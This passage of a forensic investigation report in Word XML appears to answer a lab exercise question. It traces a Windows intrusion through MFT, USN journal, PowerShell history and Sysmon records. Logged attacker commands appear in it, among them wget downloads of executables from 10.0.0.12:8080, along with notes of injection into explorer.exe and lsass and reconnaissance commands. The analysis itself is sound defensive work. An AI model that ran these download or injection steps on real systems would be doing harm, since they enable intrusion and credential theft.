            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $FN modification (M) ; $FN access (A) ; $FN MFT change (C)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\1.exe</w:t>
              <w:br/>
              <w:t>size=986624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#119927</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:55.603703</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\1.exe</w:t>
              <w:br/>
              <w:t>FileCreate [Archive] entry=90508-6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#129184</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:55.494829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wget http://10.0.0.12:8080/1.exe -o 1.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#8814</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:36:48.063750</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>PowerShell history (PSReadLine)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>history: mtime</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\AppData\Roaming\Microsoft\Windows\PowerShell\psreadline\ConsoleHost_history.txt</w:t>
              <w:br/>
              <w:t>command=wget http://10.0.0.12:8080/pscp.exe -o test.exe | order=3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/powershell_history.jsonl#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\AppData\Roaming\Microsoft\Windows\PowerShell\psreadline\ConsoleHost_history.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:09:10.219150</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>powershell</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 736, ProcessGUID: e6e9f951-0f56-654e-af01-000000000500 | RuleName: - | MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481 | ParentProcess: C:\Windows\Sys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18677</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Q6. Give the chain of processes used by the malicious executable (mal.exe -&gt; migrated.exe -&gt; other exes), using ProcessGuid and ParentProcessGuid.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r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Process chain from Sysmon EID 1, with each child's ParentProcessGuid matching the parent's ProcessGuid. Times are UTC.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Launch context:** user explorer.exe {e6e9f951-0907-654e-5c00-000000000500} → elevated powershell.exe PID 1088 {e6e9f951-0de1-654e-8801-000000000500}.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Malicious executable:** C:\Payloads\pscp.exe, PID 2196, ProcessGuid {e6e9f951-0ded-654e-8f01-000000000500}, ParentProcessGuid {…0de1-654e-8801…}, started 11:03:09.902.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Migration target:** explorer.exe, PID 7324, ProcessGuid {e6e9f951-0ded-654e-9001-000000000500}, ParentProcessGuid {…0ded-654e-8f01…}, started 11:03:09.989. pscp.exe then injected it with a remote thread (Sysmon 8). Explorer 7324 in turn opened a remote thread in lsass.exe at 11:03:56.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Children of explorer 7324:**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - cmd.exe PID 6600 {e6e9f951-0e2d-654e-9101-000000000500}, parent {…0ded-654e-9001…}, 11:04:13. Its children:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">    - tracert PID 2764 {e6e9f951-0e47-654e-9301-…}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">    - tracert PID 7720 {…0e5d-654e-9401…}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">    - tracert PID 2180 {…0e68-654e-9501…}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">    - quser PID 7752 {…0e85-654e-9601…}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - cmd.exe PID 5848 {e6e9f951-0f52-654e-ad01-000000000500}, parent {…0ded-654e-9001…}, 11:09:06. Its children:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">    - powershell PID 736 {e6e9f951-0f56-654e-af01-000000000500}, 11:09:10. It downloaded 1.exe and made the network connection to 10.0.0.12:8080.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">    - tasklist PID 8012 {…0fdb-654e-ba01…}, 11:11:23</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">    - netstat -ntb PID 6292 {…1017-654e-c701…}, 11:12:23</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">    - whoami /user PID 7220 {…1055-654e-cb01…}, 11:13:25</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">    - net user administrator PID 736 {…105f-654e-cc01…}, 11:13:35. Its child is net1 PID 1152 {…105f-654e-cd01…}. The PID 736 was reused, but the GUID is different.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Summary chain: pscp.exe {…8f01…} → explorer.exe {…9001…} → cmd.exe {…9101…}/{…ad01…} → tracert/quser/powershell/tasklist/netstat/whoami/net → net1.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11:03:09.989870</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>explorer.exe</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 7324, ProcessGUID: e6e9f951-0ded-654e-9001-000000000500 | RuleName: - | MD5=9FBBF189473A313776019D2EAA72A47A,SHA256=CEF64201A97E08834F5C8952907A1719531A7D99B53309CB2E2956F40CFF3486,IMPHASH=D505016A935B17367AA0263582F3F1E2 | ParentProcess: C:\Payloads\p</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18651</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.990398</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 8 | Microsoft-Windows-Sysmon | CreateRemoteThread | StartAddress: 0x0000000000B30000 | RuleName: - | SourceProcessID: 2196, SourceProcessGUID: e6e9f951-0ded-654e-8f01-000000000500 | SourceImage: C:\Payloads\pscp.exe | TargetProcessID: 7324, TargetProcessGUID: e6e9f951-0ded-654e-9001-000000000500 | TargetImage: C</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18652</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:04:13.885211</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\system32\cmd.exe</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 6600, ProcessGUID: e6e9f951-0e2d-654e-9101-000000000500 | RuleName: - | MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18 | ParentProcess: C:\Windows\ex</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18655</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:04:39.859949</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>tracert  -h</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 2764, ProcessGUID: e6e9f951-0e47-654e-9301-000000000500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evtxecmd/evtxecmd_0.csv#18656</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:05:01.056649</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>tracert  -m 6 8.8.8.8</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 7720, ProcessGUID: e6e9f951-0e5d-654e-9401-000000000500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evtxecmd/evtxecmd_0.csv#18657</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:05:12.550053</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>tracert  -h 6 8.8.8.8</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 2180, ProcessGUID: e6e9f951-0e68-654e-9501-000000000500 | RuleName: - | MD5=2EFE82589249126CA80CC1C536FCBDDA,SHA256=5817A6B5D24D21E19A05A08253737B1D2842B612EC1B90F9B928D78FAD271092,IMPHASH=7A80F2FE2DD40125FA241B4F53DF08D1 | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18658</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:05:41.182379</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>quser</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 7752, ProcessGUID: e6e9f951-0e85-654e-9601-000000000500 | RuleName: - | MD5=3147F9B0C7089DD698778246E835C494,SHA256=6EE15E5B1311D501FBDAA15C9D1197BA2F99745EA5ABB3E724D598EE53D48A6E,IMPHASH=EA8421BD383CD44D7C13D5BBB67DDFA5 | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18659</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:09:06.424384</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\system32\cmd.exe</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 5848, ProcessGUID: e6e9f951-0f52-654e-ad01-000000000500 | RuleName: - | MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18 | ParentProcess: C:\Windows\ex</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18676</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:09:10.219150</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
